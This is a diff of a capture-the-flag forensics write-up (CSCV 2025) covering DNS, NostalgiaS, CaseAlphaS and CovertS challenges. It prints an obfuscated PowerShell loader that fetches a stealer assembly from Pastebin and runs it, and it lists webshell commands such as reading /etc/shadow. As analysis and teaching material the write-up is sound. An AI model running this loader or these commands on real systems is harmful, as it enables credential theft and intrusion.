@@ -20,18 +20,19 @@ I inspected the `.pcap` and saw only a large number of DNS entries.
 
 ![alt text](<../../../assets/images/CSCV-2025/DNS/image copy.png>)
 
-I turned my attention to the logs. I spotted suspicious entries showing an `admin` authentication and commands being executed.
+I turned my attention to the logs and spotted suspicious entries showing `admin` authentication and commands being executed.
 
 ![alt text](<../../../assets/images/CSCV-2025/DNS/image copy 2.png>)
 
 Commands executed via the webshell:
-- whoami
-- id 
-- uname -a
-- ping -c 10.10.10.53
-- cat /etc/shadow (blocked)
-- cat /flag (blocked)
-- ls -la /var/www/html
+
+- `whoami`
+- `id`
+- `uname -a`
+- `ping -c 10.10.10.53`
+- `cat /etc/shadow` (blocked)
+- `cat /flag` (blocked)
+- `ls -la /var/www/html`
 
 I found a file called `getfile.php` uploaded to `/var/www/html/media`.
 
@@ -738,13 +739,13 @@ IOCs:
 
 #### Extracted PowerShell
 
-I extracted the PowerShell from the given link
+I extracted the PowerShell from the given link:
 
 ```powershell
-Iex(neW-obJecT  iO.cOMPrESsion.DeflaTEStreAM([iO.meMORysTrEAM] [convErt]::FroMbase64sTrInG('hVNhb9owEP2OxH+wUCSCIIZO06Qy7QNt1a1rxyZg6ybEJic5iFfHzhxTiLr+953BlKSgNV+i3N17797lzhvkOaShKL5qQd6RRmJMlve73YzlBkIuaaTSrmar7mnvD/wYfxg06jXvu9LXUGB5b/3qNX5PigyGLAVLMDbABOiPTDKOYA10xGPQ1zy6s9BPYBIV74pHS4nBes3ogjzUawQf7xbCc8FBGiwYwir4HP6GyJBxgQ2ldAiGPlU4BMhIxRCfK2m2sD0HvVArKRSLx0ZzufC9kt3Wc0F6wfNM5eC7jMsnsP7GxBJyy1zVohPNU79FgjwT3JBmp0n+ktsENOzafiDeLxKkzEQJaf7srae94HQQXLJgPmt7TfJYUXLkZ4XZiJXchxiazkq90BuQC5NsgXOlie9x+0PeEnwHwhyW2ky73drN+UBw6vEZMkzR2j1oM+v3J8om/D2TLXGWO+TkjRtT1YPSfMElE/8xUVZ92ceR6mNWKrrOy6G/IFyjhlvgY+0ztx92Em7lRjAX2D5Xku62B4dzg0vlV1Ura8PnaOXpMAIJpNEgAZMxKd/ANl51YphegLFQa2HXEH2/je1JWyVMuqG8knNlMXsGi9rK+SXZzjFvZ1zGeCKXgi1y9Dc2zPAIB4bzern6yzIUPDreEb2S9+oOG5dLITpk83q+Oo8k2pyImwOs8ZpOMPwP' ) ,[SYSTeM.io.comPRESsion.COmPRessiONmODe]::DECompResS) |FOReach-oBJeCt{ neW-obJecT  SyStEM.Io.STreAmREaDeR( $_,[TEXT.EncOdiNG]::ascIi ) }| FOreacH-objeCT{$_.rEAdToeND( ) }) 
+Iex(neW-obJecT  iO.cOMPrESsion.DeflaTEStreAM([iO.meMORysTrEAM] [convErt]::FroMbase64sTrInG('hVNhb9owEP2OxH+wUCSCIIZO06Qy7QNt1a1rxyZg6ybEJic5iFfHzhxTiLr+953BlKSgNV+i3N17797lzhvkOaShKL5qQd6RRmJMlve73YzlBkIuaaTSrmar7mnvD/wYfxg06jXvu9LXUGB5b/3qNX5PigyGLAVLMDbABOiPTDKOYA10xGPQ1zy6s9BPYBIV74pHS4nBes3ogjzUawQf7xbCc8FBGiwYwir4HP6GyJBxgQ2ldAiGPlU4BMhIxRCfK2m2sD0HvVArKRSLx0ZzufC9kt3Wc0F6wfNM5eC7jMsnsP7GxBJyy1zVohPNU79FgjwT3JBmp0n+ktsENOzafiDeLxKkzEQJaf7srae94HQQXLJgPmt7TfJYUXLkZ4XZiJXchxiazkq90BuQC5NsgXOlie9x+0PeEnwHwhyW2ky73drN+UBw6vEZMkzR2j1oM+v3J8om/D2TLXGWO+TkjRtT1YPSfMElE/8xUVZ92ceR6mNWKrrOy6G/IFyjhlvgY+0ztx92Em7lRjAX2D5Xku62B4dzg0vlV1Ura8PnaOXpMAIJpNEgAZMxKd/ANl51YphegLFQa2HXEH2/je1JWyVMuqG8knNlMXsGi9rK+SXZzjFvZ1zGeCKXgi1y9Dc2zPAIB4bzern6yzIUPDreEb2S9+oOG5dLITpk83q+Oo8k2pyImwOs8ZpOMPwP' ) ,[SYSTeM.io.comPRESsion.COmPRessiONmODe]::DECompResS) |FOReach-oBJeCt{ neW-obJecT  SyStEM.Io.STreAmREaDeR( $_,[TEXT.EncOdiNG]::ascIi ) }| FOreacH-objeCT{$_.rEAdToeND( ) })
 ```
 
-Decoding the `base64` blob and inflating it yielded
+Decoding the Base64 blob and inflating it yielded:
 
 ```powershell
 $AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
@@ -782,13 +783,15 @@ try {
 }
 ```
 
-1. Fetch: downloads a comma-separated hex blob from `https://pastebin.com/raw/90qeYSHA`.
-2. Parse: splits the text on commas and converts hex tokens (0xNN) into a byte array.
-3. Deobfuscate: XORs each byte with key `0x24` to recover original assembly bytes.
-4. Load & invoke: loads the bytes as a .NET assembly (`[System.Reflection.Assembly]::Load`), finds `StealerJanai.core.RiderKick` and calls its static `Run()` method.
-5. Handle errors: exits with code 1 on failure.
+**Summary:**
 
-IOCs:
+1. **Fetch:** Downloads a comma-separated hex blob from `https://pastebin.com/raw/90qeYSHA`.
+2. **Parse:** Splits the text on commas and converts hex tokens (`0xNN`) into a byte array.
+3. **Deobfuscate:** XORs each byte with key `0x24` to recover original assembly bytes.
+4. **Load & invoke:** Loads the bytes as a .NET assembly (`[System.Reflection.Assembly]::Load`), finds `StealerJanai.core.RiderKick`, and calls its static `Run()` method.
+5. **Handle errors:** Exits with code 1 on failure.
+
+**IOCs:**
 
 - Pastebin URL: `https://pastebin.com/raw/90qeYSHA`
 - XOR key: `0x24`
@@ -797,11 +800,11 @@ IOCs:
 
 #### Payload
 
-XOR-ing the content in Pastebin yields the stealer assembly.
+XOR-ing the content from Pastebin yields the stealer assembly.
 
 ![alt text](<../../../assets/images/CSCV-2025/NostalgiaS/image copy 17.png>)
 
-Using `dnSpy` to decompile the assembly I found the string `hensh1n` referenced in the code.
+Using `dnSpy` to decompile the assembly, I found the string `hensh1n` referenced in the code.
 
 ![alt text](<../../../assets/images/CSCV-2025/NostalgiaS/image copy 18.png>)
 
@@ -817,7 +820,7 @@ From the code, the flag format is:
 CSCV2025{your_computer_<DESKTOP NAME>_has_be3n_kicked_by_<hensh1n_registryValue>}
 ```
 
-Using the provided disk image I located the desktop name in `System.evtx` and the registry value in the user's `NTUSER.DAT` (viewed with Registry Explorer):
+Using the provided disk image, I located the desktop name in `System.evtx` and the registry value in the user's `NTUSER.DAT` (viewed with Registry Explorer):
 
 ![alt text](<../../../assets/images/CSCV-2025/NostalgiaS/image copy 20.png>)
 
@@ -849,7 +852,7 @@ My goal was to unlock the BitLocker encrypted external drive - the `.vhdk`. I ex
 
 #### ChatGPT and Simplenote Data
 
-Scrolling through the files, I saw in the `Downloads` folder there were:
+Scrolling through the files, I saw that in the `Downloads` folder there were:
 - `ChatGPT Installer.exe`
 - `Firefox Installer.exe`
 - `Git-2.51.0.2-64-bit.exe`
@@ -858,15 +861,15 @@ Scrolling through the files, I saw in the `Downloads` folder there were:
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 4.png>)
 
-My first thought was that the recovery key was stored in the `Simplenote` app. So I went hunting for the app's local storage. At first, I found no documentation about it storing data locally, but after some persistent searching, I was able to find it at `Users\windows\AppData\Packages`. There I located the data for both `Simplenote` and `ChatGPT`.
+My first thought was that the recovery key was stored in the `Simplenote` app, so I went hunting for the app's local storage. At first, I found no documentation about it storing data locally, but after some persistent searching, I found it at `Users\windows\AppData\Packages`. There I located the data for both `Simplenote` and `ChatGPT`.
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 5.png>)
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 6.png>)
 
-#### Bitlocker recovery key
+#### BitLocker Recovery Key
 
-Digging through the `ChatGPT` folder, I got access to the chat history which contained the BitLocker recovery key.
+Digging through the `ChatGPT` folder, I gained access to the chat history, which contained the BitLocker recovery key.
 
 ```text
 028853-431640-166364-032076-217943-045837-542388-281017
@@ -874,13 +877,13 @@ Digging through the `ChatGPT` folder, I got access to the chat history which con
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 7.png>)
 
-Now I just needed to unlock the external drive, which revealed a `.zip` file that was password protected.
+I then unlocked the external drive, which revealed a `.zip` file that was password protected.
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 8.png>)
 
-#### Zip password
+#### ZIP Password
 
-Thinking the password might be in the notes, I went back and found the `Simplenote` data, and I found what I was looking for.
+Thinking the password might be in the notes, I went back and found the `Simplenote` data, which contained what I was looking for.
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 9.png>)
 
@@ -894,7 +897,7 @@ Extracting it gave me:
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 11.png>)
 
-Accessing the Pastebin gave me the flag.
+Accessing the Pastebin URL gave me the flag.
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 12.png>)
 
@@ -902,12 +905,68 @@ Accessing the Pastebin gave me the flag.
 CSCV2025{h3Y_Th!s_|5_jUs7_tH3_bE9IN|\|iNg_dc8fb5bdedd10877}
 ```
 
-### Unintended solution
+### Unintended Solution
 
-Digging a bit more, I found the VMware DnD folder in `%TEMP%` which contained a zip file called `secret.zip` that was password protected.
+Digging a bit more, I found the VMware DnD folder in `%TEMP%`, which contained a ZIP file called `secret.zip` that was password protected.
 
 ![alt text](<../../../assets/images/CSCV-2025/CaseAlphaS/image copy 13.png>)
 
-This was the zip stored in the locked drive, which allowed me to skip going through the ChatGPT data.
+This was the same ZIP stored in the locked drive, which allowed me to skip going through the ChatGPT data.
 
 ## CovertS
+
+![alt text](../../../assets/images/CSCV-2025/CovertS/image.png)
+
+### Thought process
+
+I received a `.pcap` file that was 1.2GB in size, which is exceptionally large for a network capture. 
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy.png>)
+
+Opening the pcap revealed approximately 1 million packets containing `TLS`, `QUIC`, `ARP`, and other protocols. Initial inspection didn't reveal anything particularly notable.
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 2.png>)
+
+#### Finding the User's IP
+
+Using the filter `ntp` revealed the user's IP address.
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 3.png>)
+
+The user's IP is `192.168.203.91`.
+
+#### Protocol Analysis
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 4.png>)
+
+Since data exfiltration would require splitting the file into many parts across numerous packets, I could exclude low-volume protocols like `ARP`, `HTTP`, `NTP`, and `UDP`.
+
+#### TCP Traffic Analysis
+
+Examining the IPv4 statistics revealed something interesting:
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 5.png>)
+
+Out of the entire list of IP addresses, two stood out: `192.168.192.1` and `192.168.203.91`. One is the user's IP and the other address fall within the `192.168.0.0/16` private network range. This aligns with the challenge description, suggesting data was being transferred between the challenge creator's computer and their friend's machine. From here I can filter for traffic that originates between these two machines using the following filter
+
+`ip.addr == 192.168.192.1 and ip.addr == 192.168.203.91`
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 6.png>)
+
+Upon closer inspection, I noticed the last packet contained the string `==` at the end. This suggested the data was Base64-encoded and transmitted via the 2-byte checksum field at the end of each packet.
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 7.png>)
+
+I used `tshark` to extract the data for decoding:
+
+```bash
+tshark -r challenge.pcapng -Y "ip.src == 192.168.203.91 && ip.dst == 192.168.192.1 && tcp.dstport == 3239" -T fields -e tcp.checksum > out.txt
+```
+
+I then used CyberChef to decode the extracted data:
+
+![alt text](<../../../assets/images/CSCV-2025/CovertS/image copy 8.png>)
+
+```
+CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}
+```
